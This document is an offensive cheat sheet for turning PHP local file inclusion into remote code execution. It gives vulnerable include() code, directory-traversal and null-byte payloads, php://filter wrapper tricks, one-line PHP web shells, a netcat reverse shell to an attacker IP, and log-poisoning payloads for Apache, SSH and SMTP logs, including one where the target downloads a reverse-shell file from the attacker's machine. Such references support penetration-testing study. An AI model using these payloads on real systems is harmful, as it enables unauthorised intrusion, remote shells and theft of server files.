# LFI---RCE-Cheat-Sheet

Local File Inclusions occur when an HTTP-GET request has an unsanitized variable input which will allow you to traverse the directory and read files. This attack can often provide key information during a reconnaissance and can sometimes be used to gain remote code execution.


# Vulnerable PHP Code (LFI) 1

Basic unsecure code
```
<?php
$file = $_GET['file'];

 include('directory/' . $file)

?>

Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
    
```

# Vulnerable PHP Code (LFI) 2

Basic unsecure code
```
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>


Example URL: http//10.10.10.10/index.php?file=../../../../../../../etc/passwd
    
```

# Secure PHP Code (LFI) 

Secure code - More secure than above , but still expliotable
```
<?php

if(isset($_GET['file']))
{
        $file=str_replace('../','',$_GET['file']);
        $file=str_replace('./','',$file);
        echo @file_get_contents('./'.$file);
}

?>
    
```

# Bypassing PHP via NULL Byte

```
http://example.com/index.php?page=../../../etc/passwd%00 // Only applies to PHP 5.3.4 and below
    
```

# Bypassing PHP via WRAPPERS

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
    
```

# PHP RCE

```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

# LFI to RCE via Apache Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 



Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 



Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 


file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php

```

# LFI to RCE via SSH Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 



Payload: ssh <?php system($_GET['c']);?>@<target_ip>


Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id

```

# LFI to RCE via SMTP Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 



telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id


```
